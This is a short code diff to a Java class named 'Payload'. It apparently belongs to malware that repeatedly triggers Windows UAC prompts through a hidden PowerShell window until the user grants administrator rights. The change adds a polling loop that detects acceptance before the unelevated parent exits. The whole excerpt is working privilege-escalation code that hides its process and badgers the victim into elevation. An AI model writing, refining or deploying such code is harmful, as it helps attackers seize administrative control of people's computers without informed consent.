@@ -163,12 +163,21 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                // Launch PowerShell hidden and wait for the user to click Yes or No
                 Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
                 p.waitFor();
                 
-                // If the user clicked Yes, the elevated process will have deleted the lock file.
-                if (!lockFile.exists() || lockFile.delete()) {
+                // If the user clicked Yes, the elevated process starts. We give it 5 seconds to delete the lock file.
+                log("Waiting 5 seconds for elevated process to delete lock...");
+                boolean accepted = false;
+                for (int i = 0; i < 500; i++) { 
+                    if (!lockFile.exists() || lockFile.delete()) {
+                        accepted = true;
+                        break;
+                    }
+                    Thread.sleep(10);
+                }
+                
+                if (accepted) {
                     log("UAC Accepted. Parent exiting.");
                     lockStream.close();
                     System.exit(0); 
